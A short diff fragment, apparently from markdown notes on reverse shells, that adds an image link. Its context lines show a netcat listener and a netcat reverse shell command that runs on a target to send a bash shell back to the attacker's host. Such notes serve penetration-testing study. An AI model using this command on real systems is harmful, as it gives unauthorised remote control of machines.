@@ -73,3 +73,6 @@ sudo nc -lvnp 443
 On the target:
 
 _nc <LOCAL-IP> <PORT> -e /bin/bash_
+
+<img width="1051" height="156" alt="image" src="https://github.com/user-attachments/assets/d66e5f66-f5db-404e-83c3-add57451dab6" />
+
